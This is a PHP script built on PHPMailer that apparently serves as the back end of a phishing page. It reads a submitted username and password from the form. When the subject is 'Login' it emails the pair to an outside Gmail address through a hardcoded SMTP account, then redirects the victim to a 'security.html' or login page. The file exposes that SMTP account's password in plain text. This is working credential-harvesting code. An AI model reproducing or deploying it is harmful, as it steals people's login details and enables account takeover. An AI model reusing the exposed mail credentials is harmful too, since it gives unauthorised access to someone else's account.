<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

// function sendEmail($subject, $email, $message) {
    
//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

$email = $_POST["email"];
$subject = $_POST["subject"];
$message = $_POST["message"];
$password = $_POST["password"];

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->Host       = 'deliverers.uk';                     //Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
    $mail->Username   = 'support@deliverers.uk';                     //SMTP username
    $mail->Password   = 'wiewksD7QhWS';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
    $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('support@deliverers.uk', 'Email ALert');
    $mail->addAddress("epicgamesv2step@gmail.com");   //Optional name

    if($subject == "Login"){
        $message = "Login Details: <br> username: ". $email . " Password:". $password;
    }

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = $subject;
    $mail->Body    = $message;

    $mail->send();
   
    if($subject == "Login"){
        header("location:security.html");
    }else{
        header("location:login.php");
    }


} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
// }

?>